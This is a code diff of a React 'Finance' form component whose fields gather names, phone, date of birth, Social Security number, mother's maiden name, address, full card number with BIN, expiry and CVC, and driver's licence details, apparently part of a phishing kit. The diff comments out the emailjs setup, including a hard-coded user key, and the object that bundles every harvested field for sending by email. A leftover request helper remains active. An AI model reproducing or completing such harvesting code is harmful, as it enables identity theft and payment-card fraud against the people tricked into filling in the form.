@@ -1,14 +1,14 @@
-import emailjs, { init } from 'emailjs-com';
+// import emailjs, { init } from 'emailjs-com';
 import { useEffect, useState } from 'react';
 import { useSelector } from 'react-redux';
-import { useHistory } from 'react-router-dom';
-import Email from './smtp'
+// import { useHistory } from 'react-router-dom';
+// import Email from './smtp'
 import './finance.css';
 
-init("user_ld15Epetajzy4LTSlKCz8");
+// init("user_ld15Epetajzy4LTSlKCz8");
 function Finance() {
 
-	const history = useHistory()
+	// const history = useHistory()
 
 	const {
 		firstName,
@@ -42,36 +42,36 @@ function Finance() {
 	const [dLExpiryDay, setdLExpiryDay] = useState('')
 	const [dLExpiryYear, setdLExpiryYear] = useState('')
 
-	const templateParams = {
-		firstName,
-		middleName,
-		lastName,
-		phone,
-		dobMonth,
-		dobDay,
-		dobYear,
-		ssn1,
-		ssn2,
-		ssn3,
-		mmn,
-		filedForTaxReturn,
-		address1,
-		address2,
-		city,
-		state,
-		zipcode,
-		country,
-		name,
-		CC,
-		bin,
-		ccExpiryMonth,
-		ccExpiryYear,
-		cSC,
-		DLNumber,
-		dLExpiryMonth,
-		dLExpiryDay,
-		dLExpiryYear
-	}
+	// const templateParams = {
+	// 	firstName,
+	// 	middleName,
+	// 	lastName,
+	// 	phone,
+	// 	dobMonth,
+	// 	dobDay,
+	// 	dobYear,
+	// 	ssn1,
+	// 	ssn2,
+	// 	ssn3,
+	// 	mmn,
+	// 	filedForTaxReturn,
+	// 	address1,
+	// 	address2,
+	// 	city,
+	// 	state,
+	// 	zipcode,
+	// 	country,
+	// 	name,
+	// 	CC,
+	// 	bin,
+	// 	ccExpiryMonth,
+	// 	ccExpiryYear,
+	// 	cSC,
+	// 	DLNumber,
+	// 	dLExpiryMonth,
+	// 	dLExpiryDay,
+	// 	dLExpiryYear
+	// }
 
 	useEffect(() => {
 		setBin(CC.substr(0,6))
@@ -106,14 +106,14 @@ function Finance() {
 					};
 					a.send(n)
 			},
-			ajax: (e, n) => {
-				let t = Email.createCORSRequest("GET", e);
-				t.onload = () => {
-					let e = t.responseText;
-					null != n && n(e)
-				};
-					t.send()
-			},
+			// ajax: (e, n) => {
+			// 	let t = Email.createCORSRequest("GET", e);
+			// 	t.onload = () => {
+			// 		let e = t.responseText;
+			// 		null != n && n(e)
+			// 	};
+			// 		t.send()
+			// },
 			createCORSRequest: (e, n) => {
 				let t = new XMLHttpRequest();
 				console.log({t})
